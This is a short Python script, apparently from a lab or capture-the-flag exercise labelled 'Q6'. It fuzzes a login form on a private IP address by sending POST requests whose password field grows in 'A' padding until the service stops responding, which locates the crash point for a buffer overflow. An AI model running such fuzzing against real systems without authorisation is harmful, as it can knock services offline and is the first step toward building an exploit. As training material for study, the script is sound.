#!/usr/bin/env python3
import socket, time

TARGET_IP   = '10.1.116.86'
TARGET_PORT = 80
PATH        = '/login'

start_len = 100
end_len   = 2000
step      = 100

def send_payload(length):
    payload = 'A' * length
    body    = f"username=test&password={payload}"
    req = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {TARGET_IP}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        "\r\n"
        f"{body}"
    )
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((TARGET_IP, TARGET_PORT))
        s.sendall(req.encode())
        s.recv(1024)
        s.close()
        return True
    except:
        return False

if __name__ == '__main__':
    print("Q6: Simple fuzzing to find crash threshold")
    for length in range(start_len, end_len+1, step):
        ok = send_payload(length)
        print(f"  Testing {length:4d} bytes → {'OK' if ok else 'CRASH'}")
        if not ok:
            print(f"\n[!] Crash detected at ~{length} bytes\n")
            break
        time.sleep(0.2)
